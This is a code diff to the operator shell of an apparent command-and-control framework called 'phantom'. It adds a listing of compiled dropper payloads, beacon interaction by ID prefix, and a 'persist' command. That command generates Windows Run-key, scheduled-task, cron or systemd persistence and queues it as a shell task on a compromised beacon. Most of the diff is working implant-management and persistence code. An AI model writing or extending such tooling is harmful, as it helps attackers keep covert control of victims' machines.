@@ -8,8 +8,20 @@ from datetime import datetime
 from phantom.core.c2_server import server_instance, c2_state
 from phantom.core.session import session
 from phantom.utils.notifier import notifier
+from phantom.utils.c2_helpers import BEACON_COMMANDS, format_beacon_output
 
 console = Console()
+
+
+def _resolve_beacon_id(bid: str) -> str | None:
+    """Match beacon by full or prefix ID."""
+    beacons = c2_state.get_beacons()
+    if bid in beacons:
+        return bid
+    matches = [k for k in beacons if k.startswith(bid)]
+    if len(matches) == 1:
+        return matches[0]
+    return None
 
 def build_c2_banner():
     return r"""
@@ -108,16 +120,74 @@ class C2Shell(cmd.Cmd):
             
         console.print(table)
 
-    def do_interact(self, arg):
-        """interact <beacon_id> - drop into beacon interaction mode"""
-        bid = arg.strip()
-        beacons = c2_state.get_beacons()
-        if not bid or bid not in beacons:
-            notifier.error("Invalid or missing Beacon ID.")
+    def do_payloads(self, arg):
+        """payloads [id] - list compiled payload droppers (optionally show one by id)"""
+        from phantom.utils.payload_manager import get_custom_beacons
+
+        history = get_custom_beacons()
+        if not history:
+            notifier.warn("No compiled payloads in history.")
             return
-        
-        self.active_beacon = bid
-        notifier.success(f"Interacting with beacon {bid}")
+
+        bid = arg.strip()
+        if bid:
+            matches = [e for e in history if e.get("id", "").startswith(bid)]
+            if not matches:
+                notifier.error(f"No payload found with id '{bid}'.")
+                return
+            if len(matches) > 1:
+                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
+                return
+            entry = matches[0]
+            console.print(Panel(
+                entry.get("command", ""),
+                title=f"[bold]{entry.get('platform', 'unknown').upper()}[/] — {entry.get('description', '')}",
+                subtitle=f"Created: {entry.get('created_at', 'Unknown')}  |  Source: {entry.get('source', 'unknown')}",
+                border_style="magenta",
+            ))
+            return
+
+        table = Table(title="Compiled Payload History", border_style="magenta")
+        table.add_column("ID", style="cyan", no_wrap=True)
+        table.add_column("Platform", style="green")
+        table.add_column("Description", style="white")
+        table.add_column("Source", style="dim")
+        table.add_column("Created", style="yellow")
+        table.add_column("Command Preview", style="dim", overflow="fold")
+
+        for entry in reversed(history):
+            cmd = entry.get("command", "")
+            preview = (cmd[:60] + "...") if len(cmd) > 63 else cmd
+            table.add_row(
+                entry.get("id", "")[:8] + "...",
+                entry.get("platform", "unknown"),
+                entry.get("description", ""),
+                entry.get("source", ""),
+                entry.get("created_at", ""),
+                preview,
+            )
+
+        console.print(table)
+        console.print("[dim]Use 'payloads <full-id>' to view the complete dropper command.[/dim]")
+
+    def do_interact(self, arg):
+        """interact <beacon_id> - drop into beacon interaction mode (prefix match supported)"""
+        bid = arg.strip()
+        if not bid:
+            notifier.error("Usage: interact <beacon_id>")
+            return
+        resolved = _resolve_beacon_id(bid)
+        if not resolved:
+            matches = [k for k in c2_state.get_beacons() if k.startswith(bid)]
+            if len(matches) > 1:
+                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
+            else:
+                notifier.error("Invalid or missing Beacon ID.")
+            return
+
+        self.active_beacon = resolved
+        notifier.success(f"Interacting with beacon {resolved}")
+        console.print("[dim]Type 'beacon-help' for agent commands. Use 'results' after tasks complete.[/dim]")
 
     def do_back(self, arg):
         """back - return to main C2 shell from interaction mode"""
@@ -150,7 +220,53 @@ class C2Shell(cmd.Cmd):
 
         for res in results:
             console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
-            console.print(res["output"])
+            display, extra = format_beacon_output(res["output"])
+            console.print(display)
+            if extra:
+                notifier.success(extra)
+
+    def do_persist(self, arg):
+        """persist [runkey|schtask|cron|systemd] - Generate and queue a persistence task for the active beacon."""
+        if not self.active_beacon:
+            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
+            return
+
+        parts = arg.split()
+        if not parts:
+            notifier.error("Usage: persist [runkey|schtask|cron|systemd]")
+            return
+
+        method = parts[0]
+        beacons = c2_state.get_beacons()
+        info = beacons.get(self.active_beacon, {})
+        os_type = info.get("os", "").lower()
+        
+        # Determine current binary path (best guess)
+        # In a real scenario, we might want to move the beacon first.
+        # For now, let's assume we use the current path or ask the user.
+        binary_path = input("[?] Full path of the beacon on target: ").strip()
+        if not binary_path:
+            notifier.error("Path is required for persistence.")
+            return
+
+        from phantom.core.persistence import persistence_manager
+        cmd = ""
+        if method == "runkey": cmd = persistence_manager.get_windows_runkey(binary_path)
+        elif method == "schtask": cmd = persistence_manager.get_windows_schtask(binary_path)
+        elif method == "cron": cmd = persistence_manager.get_linux_cron(binary_path)
+        elif method == "systemd": cmd = persistence_manager.get_linux_systemd(binary_path)
+        else:
+            notifier.error(f"Unknown persistence method: {method}")
+            return
+
+        if cmd:
+            task_id = c2_state.queue_task(self.active_beacon, f"shell {cmd}")
+            notifier.success(f"Persistence task queued: {method}")
+            notifier.info(f"Task ID: {task_id}")
+
+    def do_beacon_help(self, arg):
+        """beacon-help - list commands supported by the C++ beacon agent"""
+        console.print(Panel(BEACON_COMMANDS, title="[bold]Beacon Agent Commands[/]", border_style="magenta"))
 
     def do_generate(self, arg):
         """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
@@ -204,9 +320,12 @@ class C2Shell(cmd.Cmd):
         port = int(session.lport) if session.lport else (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443)
 
         # Compile and generate dropper
-        beacon_path = compile_beacon(platform, pkg_root)
+        beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True)
         if not beacon_path:
             return
+
+        if not (server_instance.thread and server_instance.thread.is_alive()):
+            notifier.warn(f"Listener not active. Run: listeners start {port}")
 
         dropper = generate_dropper(platform, host, port)
         if not dropper:
